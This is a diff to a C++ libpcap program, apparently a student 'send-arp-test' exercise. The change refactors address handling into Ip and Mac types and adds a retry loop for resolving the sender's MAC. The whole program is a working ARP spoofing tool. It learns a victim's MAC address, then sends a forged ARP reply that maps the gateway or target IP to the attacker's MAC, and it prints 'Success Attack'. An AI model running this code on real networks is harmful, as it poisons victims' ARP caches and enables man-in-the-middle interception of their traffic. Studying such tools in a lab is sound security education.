@@ -28,9 +28,9 @@ struct EthArpPacket final {
 };
 #pragma pack(pop)
 
-void GetMyInfo(char* ip, char* mac, char* dev);
-int GetYourMac(pcap_t* handle, char* myIp, char* myMac, char* yourIp, char* yourMac);
-void SendArpPacket(int mode, pcap_t* handle, char* eth_smac, char* eth_dmac, char* arp_smac, char* arp_sip,char* arp_tmac, char* arp_tip);
+void GetMyInfo(Ip *myIp, Mac *myMac, char* dev);
+int GetSenderMac(pcap_t* handle, Ip myIp, Mac myMac, Ip senderIp, Mac* senderMac);
+void SendArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip);
 
 EthArpPacket packet;
 
@@ -39,7 +39,7 @@ void usage() {
 	printf("sample: send-arp-test wlan0\n");
 }
 
-void GetMyInfo(char* ip, char* mac, char* dev){
+void GetMyInfo(Ip* myIp, Mac* myMac, char* dev){
 	int fd;
 	struct ifreq ifr;
 
@@ -47,55 +47,59 @@ void GetMyInfo(char* ip, char* mac, char* dev){
 	ifr.ifr_addr.sa_family = AF_INET;
 
 	memcpy(ifr.ifr_name, dev, IFNAMSIZ -1);
+
+	if(!ioctl(fd, SIOCGIFHWADDR, &ifr))
+		*myMac = Mac((uint8_t *)(ifr.ifr_hwaddr.sa_data));
+	printf("[MY MAC ADDR = %s]\n", std::string(*myMac).data());
     
-    ioctl(fd, SIOCGIFADDR, &ifr);
-    strcpy(ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
-    printf("[MY IP ADDR = %s]\n", ip);
-
-	ioctl(fd, SIOCGIFHWADDR, &ifr);
-	sprintf(mac,MACSTR,MAC2STR((unsigned char*)(ifr.ifr_hwaddr.sa_data)));
-    printf("[MY MAC ADDR = %s]\n", mac);
-
+    if(!ioctl(fd, SIOCGIFADDR, &ifr))
+		*myIp = Ip(std::string(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr)));
+	
+    printf("[MY IP ADDR = %s]\n\n", std::string(*myIp).data());
+	
 	close(fd);
 	return;
 }
 
 
-int GetYourMac(pcap_t* handle, char* myIp, char* myMac, char* yourIp, char* yourMac){
+int GetSenderMac(pcap_t* handle, Ip myIp, Mac myMac, Ip senderIp, Mac* senderMac){
 	// mode : 0 = request, 1 = reply
-	char broadcast[20] = "ff:ff:ff:ff:ff:ff";
-	char unknown[20] ="00:00:00:00:00:00";
-
+	Mac broadcast = Mac::broadcastMac();
+	Mac unknown = Mac::nullMac();
 
 	//eth_smac, eth_dmac, arp_smac, arp_sip, arp_tmac, arp_tip
 	struct pcap_pkthdr* header;
-	const u_char* packet2;
+	const u_char* replyPacket;
 
-	SendArpPacket(0, handle, myMac, broadcast, myMac, myIp, unknown, yourIp);
+	while(true){
+		SendArpPacket(0, handle, myMac, broadcast, myMac, myIp, unknown, senderIp);
 	
-	int res = pcap_next_ex(handle, &header, &packet2);
-	if (res == 0) return 0;
-	if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-		printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+		int res = pcap_next_ex(handle, &header, &replyPacket);
+		if (res == 0) return 0;
+		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+			return 0;
+		}
+		
+		EthArpPacket* resPacket;
+
+		resPacket = (struct EthArpPacket *)replyPacket;
+		if(resPacket->arp_.sip() == senderIp && resPacket->arp_.tip() == myIp){
+			*senderMac = Mac((uint8_t *)(resPacket->arp_.smac_));
+			printf("[Sender MAC ADDR = %s]\n",std::string(*senderMac).data());
+			printf("[Sender IP ADDR = %s]\n\n",std::string(senderIp).data());
+			return 1;
+		}
+		else continue;
 	}
-	
-	EthArpPacket* yourPacket;
-
-	yourPacket = (struct EthArpPacket *)packet2;
-
-	sprintf(yourMac, MACSTR, MAC2STR((u_char*)(yourPacket->arp_.smac_)));
-
-	printf("[VICTIM MAC ADDR = %s]\n",yourMac);
-
-	return 1;
 }
 
 
-void SendArpPacket(int mode, pcap_t* handle, char* eth_smac, char* eth_dmac, char* arp_smac, char* arp_sip,char* arp_tmac, char* arp_tip){
+void SendArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip){
 	// mode : 0 = request, 1 = reply
 	
-	packet.eth_.smac_ = Mac(eth_smac);
-    packet.eth_.dmac_ = Mac(eth_dmac);
+	packet.eth_.smac_ = eth_smac;
+    packet.eth_.dmac_ = eth_dmac;
     packet.eth_.type_ = htons(EthHdr::Arp);
 
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -107,10 +111,10 @@ void SendArpPacket(int mode, pcap_t* handle, char* eth_smac, char* eth_dmac, cha
     }else if(mode == 1){
         packet.arp_.op_ = htons(ArpHdr::Reply);
     }
-    packet.arp_.smac_ = Mac(arp_smac);
-    packet.arp_.sip_ = htonl(Ip(arp_sip));
-    packet.arp_.tmac_ = Mac(arp_tmac);
-    packet.arp_.tip_ = htonl(Ip(arp_tip));
+    packet.arp_.smac_ = arp_smac;
+    packet.arp_.sip_ = htonl(arp_sip);
+    packet.arp_.tmac_ = arp_tmac;
+    packet.arp_.tip_ = htonl(arp_tip);
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
@@ -121,24 +125,24 @@ void SendArpPacket(int mode, pcap_t* handle, char* eth_smac, char* eth_dmac, cha
 }
 
 int main(int argc, char* argv[]) {
-	if (argc < 4) {
+	if (argc < 4 && argc%2 == 0) {
 		usage();
 		return -1;
 	}
 
 	char* dev = argv[1];
 
-	char* yourIp; //you == victim
-	char* gatewayIp; //gateway
-	char myIp[20] = {0,}; //my
-	
-	char yourMac[20] = {0,}; //you == victim
-	char gatewayMac[20] = {0,}; //gateway
-	char myMac[20] = {0,}; //my 0
+	Ip myIp;
+	Mac myMac;
+	Ip senderIp;
+	Mac senderMac;
+	Ip targetIp;
+	Mac targetMac;
 
+	
 	char errbuf[PCAP_ERRBUF_SIZE];
 
-	GetMyInfo(myIp, myMac, dev);
+	GetMyInfo(&myIp, &myMac, dev);
 	
 
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
@@ -148,15 +152,15 @@ int main(int argc, char* argv[]) {
 	}
 	
 	for(int i=1;i<argc/2;i++){
-		yourIp = argv[2*i];
-		gatewayIp = argv[2*i+1];
+		senderIp = Ip(std::string(argv[2*i]));
+		targetIp = Ip(std::string(argv[2*i+1]));
 		
 
-		if(!GetYourMac(handle, myIp, myMac, yourIp, yourMac)){
+		if(!GetSenderMac(handle, myIp, myMac, senderIp, &senderMac)){
 			fprintf(stderr, "couldn't get victim mac address (%s)\n",errbuf);
 		}
 		
-		SendArpPacket(1, handle, myMac, yourMac, myMac, gatewayIp, yourMac, yourIp);
+		SendArpPacket(1, handle, myMac, senderMac, myMac, targetIp, senderMac, senderIp);
 		printf("Success Attack\n");
 	}
 
